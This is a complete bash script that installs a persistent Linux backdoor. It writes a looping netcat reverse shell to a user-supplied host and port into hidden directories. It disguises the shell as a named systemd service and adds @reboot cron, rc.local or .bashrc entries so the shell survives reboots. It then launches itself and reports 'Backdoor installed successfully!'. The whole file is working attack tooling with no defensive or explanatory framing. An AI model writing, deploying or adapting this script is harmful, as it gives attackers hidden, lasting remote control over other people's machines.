#!/bin/bash

# Function to check if input is a valid IP address
function is_valid_ip() {
    local ip=$1
    local regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
    if [[ $ip =~ $regex ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        for octet in "${octets[@]}"; do
            if ((octet < 0 || octet > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

# Function to check if input is a valid port
function is_valid_port() {
    local port=$1
    if [[ "$port" =~ ^[0-9]+$ ]] && ((port > 0 && port <= 65535)); then
        return 0
    else
        return 1
    fi
}

# Ask for service name
while true; do
    read -p "Enter a fake service name: " service_name
    if [[ -n "$service_name" ]]; then
        break
    else
        echo "Service name cannot be empty!"
    fi
done

# Ask for host IP
while true; do
    read -p "Enter the host IP: " host
    if is_valid_ip "$host"; then
        break
    else
        echo "Invalid IP address! Please enter a valid IP (e.g., 192.168.1.100)."
    fi
done

# Ask for port
while true; do
    read -p "Enter the port: " port
    if is_valid_port "$port"; then
        break
    else
        echo "Invalid port! Please enter a number between 1 and 65535."
    fi
done

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    systemd_path="/etc/systemd/system/$service_name.service"
    persistence_paths=("/etc/cron.d/$service_name" "/etc/rc.local")
    user_mode=0
else
    systemd_path="$HOME/.config/systemd/user/$service_name.service"
    persistence_paths=("$HOME/.config/crontab" "$HOME/.bashrc")
    mkdir -p "$(dirname "$systemd_path")"
    user_mode=1
fi

# Hidden script paths
hidden_dirs=("/tmp/.hidden" "/dev/shm/.cache" "/var/tmp/.logs")
hidden_script=""

# Select a random hidden directory and use service name as the script name
for dir in "${hidden_dirs[@]}"; do
    mkdir -p "$dir"
    chmod 700 "$dir"
    hidden_script="$dir/$service_name.sh"
    break
done

# Check if 'nc -e' is supported
if nc -h 2>&1 | grep -q "\-e "; then
    shell_command="nc -e /bin/bash $host $port"
else
    shell_command="mkfifo /tmp/.backpipe; cat /tmp/.backpipe | /bin/bash -i 2>&1 | nc $host $port > /tmp/.backpipe"
fi

# Create the hidden persistence script
echo "#!/bin/bash
while true; do
    $shell_command
    sleep 5
done" > "$hidden_script"

# Make it executable
chmod +x "$hidden_script"

# Create systemd service file
echo "[Unit]
Description=$service_name
After=network.target

[Service]
Restart=always
ExecStart=/bin/bash -c '$hidden_script &'

[Install]
WantedBy=$( [[ $user_mode -eq 0 ]] && echo "multi-user.target" || echo "default.target")" > "$systemd_path"

# Enable and start the service
if [[ $user_mode -eq 0 ]]; then
    systemctl daemon-reload
    systemctl enable "$service_name.service"
    systemctl start "$service_name.service"
else
    systemctl --user daemon-reload
    systemctl --user enable "$service_name.service"
    systemctl --user start "$service_name.service"
fi

# Add multiple persistence methods
for path in "${persistence_paths[@]}"; do
    echo "@reboot $( [[ $user_mode -eq 0 ]] && echo "root" || echo "$USER") /bin/bash -c 'nohup $hidden_script &'" >> "$path"
done

chmod 644 "$systemd_path"

# Run the script immediately
if ! pgrep -f "$hidden_script" > /dev/null; then
    nohup "$hidden_script" &> /dev/null &
fi

echo "✅ Backdoor installed successfully! Running as $( [[ $user_mode -eq 0 ]] && echo "root" || echo "user" )."
